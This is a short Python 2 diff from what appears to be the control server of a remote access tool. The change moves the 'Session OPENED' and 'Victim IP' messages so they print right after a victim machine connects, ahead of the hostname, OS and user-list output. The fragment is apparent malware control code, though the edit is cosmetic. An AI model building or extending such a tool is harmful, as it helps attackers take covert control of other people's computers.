@@ -274,6 +274,8 @@ while True:
                 else:
                     victim,addr=server.accept()
                     licen_process=True
+                    print Fore.BLUE+'\n[*]\x1b[37mSession OPENED\x1b[0m'
+                    print Fore.BLUE+'[*]\x1b[37mVictim IP(%s)\x1b[0m'%(addr[0])
                     try:
                         hostname=victim.recv(1024)
                     except:
@@ -285,8 +287,6 @@ while True:
                         except:
                             print Back.BLUE+"\nSession Closed\n"
                         else:        
-                            print Fore.BLUE+'\n[*]\x1b[37mSession OPENED\x1b[0m'
-                            print Fore.BLUE+'[*]\x1b[37mVictim IP(%s)\x1b[0m'%(addr[0])
                             print Fore.BLUE+'[*]\x1b[37mHostname (%s)\x1b[0m'%(hostname)
                             print Fore.BLUE+'[*]\x1b[37mOS name (%s)\x1b[0m'%(os_name)
                             print Fore.WHITE+'\nID\tUser List\n===\t========='
